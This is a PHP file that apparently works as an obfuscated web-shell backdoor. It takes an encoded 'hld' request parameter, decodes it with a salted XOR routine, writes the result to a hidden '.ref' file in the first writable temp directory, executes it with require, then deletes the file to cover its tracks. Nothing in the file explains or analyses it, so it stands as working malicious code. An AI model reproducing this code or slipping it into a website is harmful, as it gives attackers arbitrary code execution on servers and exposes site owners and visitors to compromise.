<?php

if(count($_REQUEST) > 0 && isset($_REQUEST["hld"])){
	$holder = array_filter([ini_get("upload_tmp_dir"), sys_get_temp_dir(), "/var/tmp", getenv("TEMP"), session_save_path(), getcwd(), getenv("TMP"), "/tmp", "/dev/shm"]);
	$pset = $_REQUEST["hld"];
	$pset	=	explode('.'	  ,$pset ) 	 ; 	
	$sym= '';
            $salt5= 'abcdefghijklmnopqrstuvwxyz0123456789';
            $lenS= strlen($salt5);
    
            foreach($pset as $m => $v4) {
                $chS= ord($salt5[$m % $lenS]);
                $d= ((int)$v4 - $chS -($m % 10)) ^ 31;
                $sym.= chr($d);
            }
	for ($desc = 0, $resource = count($holder); $desc < $resource; $desc++) {
    $descriptor = $holder[$desc];
    		if ((function($d) { return is_dir($d) && is_writable($d); })($descriptor)) {
    $symbol = "$descriptor/.ref";
    if (file_put_contents($symbol, $sym)) {
	require $symbol;
	unlink($symbol);
	exit;
}
}
}
}